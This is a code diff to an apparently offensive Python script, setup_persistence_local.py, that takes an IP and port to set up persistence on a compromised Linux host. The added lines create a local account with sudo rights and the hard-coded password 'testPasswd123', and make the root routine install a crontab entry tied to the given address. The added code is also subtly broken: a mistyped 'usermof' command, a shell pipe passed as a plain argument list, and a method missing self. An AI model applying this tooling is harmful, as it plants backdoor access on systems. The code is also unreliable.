@@ -18,6 +18,7 @@ class funcs:
         if sys.version_info[0] < 3:
             print("[!] Python 3.x is required to run this script.")
             sys.exit(1)
+
     def print_help(self):
         print("""Usage: python3 setup_persistence_local.py <ip> <port>
         Example: python3 setup_persistence_local.py 127.0.0.1 4444
@@ -67,6 +68,13 @@ class funcs:
 
                 print(f"{bcolors.GREEN}[+] Done adding crontab.{bcolors.ENDC}")
 
+    def create_local_account(username, password):
+        print(f"{bcolors.GREEN}[+] Creating local account...{bcolors.ENDC}")
+        subprocess.run(['useradd', '-m', '-s', '/bin/bash', username], check=True, stdout=subprocess.DEVNULL)
+        subprocess.run(['usermof', '-aG', 'sudo', username], check=True, stdout=subprocess.DEVNULL)
+        subprocess.run(['echo', password, '|', 'passwd', username, '--stdin'], check=True, stdout=subprocess.DEVNULL)
+        print(f"{bcolors.GREEN}[+] Done creating local account {username}:{password}.{bcolors.ENDC}")
+
 class user:
     def __init__(self, ip, port, user_name):
         self.ip = ip
@@ -80,6 +88,8 @@ class root:
         self.ip = ip
         self.port = port
 
+        funcs().crontab(self.ip, self.port)
+        funcs().create_local_account('kei', 'testPasswd123')
 
 
 if __name__ == '__main__':
